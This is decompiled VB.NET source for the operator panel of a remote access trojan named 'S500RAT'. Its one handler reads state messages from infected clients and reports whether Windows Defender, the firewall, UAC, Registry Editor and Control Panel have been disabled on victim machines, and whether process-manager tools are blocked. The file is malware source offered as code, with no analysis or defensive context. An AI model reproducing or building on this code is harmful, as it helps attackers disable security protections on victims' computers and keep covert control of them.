Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000055 RID: 85
	Public Class FrmOptions
		' Token: 0x060011A0 RID: 4512 RVA: 0x0009B394 File Offset: 0x00099594
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formOptions As FormOptions = CType(Application.OpenForms("FormOptions" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormOptions)
				Dim flag As Boolean = formOptions IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formOptions.Client Is Nothing
					If flag2 Then
						formOptions.Client = client
						formOptions.Timer1.Enabled = True
						formOptions.Admin = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Admin").AsString)
					End If
					Console.WriteLine(unpack_msgpack.ForcePathObject("State").AsString)
					Dim asString As String = unpack_msgpack.ForcePathObject("State").AsString
					Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
					If num <= 989317590UI Then
						If num <> 395263469UI Then
							If num <> 844476846UI Then
								If num = 989317590UI Then
									If Operators.CompareString(asString, "WD", False) = 0 Then
										formOptions.DisabledWD.Enabled = False
										formOptions.StateWD.ForeColor = Color.GreenYellow
										formOptions.StateWD.Text = "Windows Defender has been successfully disabled"
									End If
								End If
							ElseIf Operators.CompareString(asString, "Registry", False) = 0 Then
								formOptions.DisabledRegistry.Enabled = False
								formOptions.StateRegistry.ForeColor = Color.LightGreen
								formOptions.StateRegistry.Text = "Registry Editor has been disabled successfully"
							End If
						ElseIf Operators.CompareString(asString, "DisabledAnti", False) = 0 Then
							formOptions.EnabledAntiProcess.Enabled = True
							formOptions.EnabledAntiProcess.Text = "Enabled"
							formOptions.StateAntiprocess.ForeColor = Color.Orange
							formOptions.StateAntiprocess.Text = "Operations management software's has been unblocked"
						End If
					ElseIf num <= 2472358640UI Then
						If num <> 1739645937UI Then
							If num = 2472358640UI Then
								If Operators.CompareString(asString, "EnabledAni", False) = 0 Then
									formOptions.EnabledAntiProcess.Enabled = True
									formOptions.EnabledAntiProcess.Text = "Disabled"
									formOptions.StateAntiprocess.ForeColor = Color.LightGreen
									formOptions.StateAntiprocess.Text = "Process manager software's is blocked"
								End If
							End If
						ElseIf Operators.CompareString(asString, "FireWall", False) = 0 Then
							formOptions.DisabledFirewall.Enabled = False
							formOptions.StateFirewall.ForeColor = Color.LightGreen
							formOptions.StateFirewall.Text = "Firewall has been successfully disabled"
						End If
					ElseIf num <> 2827912288UI Then
						If num = 4226952726UI Then
							If Operators.CompareString(asString, "Controll", False) = 0 Then
								formOptions.DisabledControl.Enabled = False
								formOptions.StateControlPanel.ForeColor = Color.LightGreen
								formOptions.StateControlPanel.Text = "Control Panel has been disabled successfully"
							End If
						End If
					ElseIf Operators.CompareString(asString, "UAC", False) = 0 Then
						formOptions.DisabledUAC.Enabled = False
						formOptions.StateUAC.ForeColor = Color.LightGreen
						formOptions.StateUAC.Text = "UAC has been disabled successfully"
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
